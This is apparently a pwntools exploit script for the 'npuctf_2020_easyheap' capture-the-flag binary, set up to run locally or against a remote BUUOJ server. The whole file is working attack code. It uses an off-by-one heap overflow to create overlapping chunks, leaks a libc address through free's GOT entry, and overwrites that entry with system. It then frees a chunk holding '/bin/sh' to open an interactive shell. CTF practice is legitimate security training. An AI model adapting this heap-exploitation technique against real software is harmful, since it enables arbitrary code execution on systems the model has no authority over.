import sys
from pwn import *
from ctypes import *
from pwn_debug.pwn_debug import *
binary='npuctf_2020_easyheap'
elf=ELF(binary)
pdbg=pwn_debug(binary)
pdbg.local("/lib/x86_64-linux-gnu/libc.so.6")
pdbg.debug("2.27")
pdbg.remote('node3.buuoj.cn',28271)
pdbg.context.log_level='debug'
while True :
	# try :
		if len(sys.argv)==1 :
			io=pdbg.run("debug")
			# io=pdbg.run("local")
			libc=pdbg.libc
			# one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
			# one_gadgaet=[0x41602,0x41656,0xdef36]
		else :
			io=pdbg.run("remote")
			# libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			libc=ELF('../../x64libc/libc.so.6')
			# one_gadgaet=[0x4f2c5,0x4f322,0x10a38c]
			# one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]


		def add(a,c):
			io.sendlineafter('Your choice :','1')
			io.sendlineafter('Size of Heap(0x10 or 0x20 only) : ',str(a))
			io.sendafter('Content:',c)

		def delete(a):
			io.sendlineafter('Your choice :','4')
			io.sendlineafter('Index :',str(a))

		def edit(a,c):
			io.sendlineafter('Your choice :','2')
			io.sendlineafter('Index :',str(a))
			io.sendafter('Content: ',c)

		def show(a):
			io.sendlineafter('Your choice :','3')
			io.sendlineafter('Index :',str(a))


		add(0x18,'\x02'*2)#0
		add(0x18,'\x03'*3)#1
		add(0x18,'/bin/sh\x00')#2
		edit(0,'a'*0x18+'\x41')
		delete(1)
		payload='a'*0x10+p64(0)+p64(0x21)+p64(0x100)+p64(elf.got['free'])
		add(0x38,payload)
		show(1)
		libcbase=u64(io.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-libc.sym['free']
		system=libcbase+libc.sym['system']
		edit(1,p64(system))
		delete(2)
	


		


		# libc_base=u64(io.recvuntil('\x7f')[-6:]+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		# system_addr=libc.sym['system']
		# bin_sh_addr=libc.search('/bin/sh\x00').next()
		success('libcbase:'+hex(libcbase))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue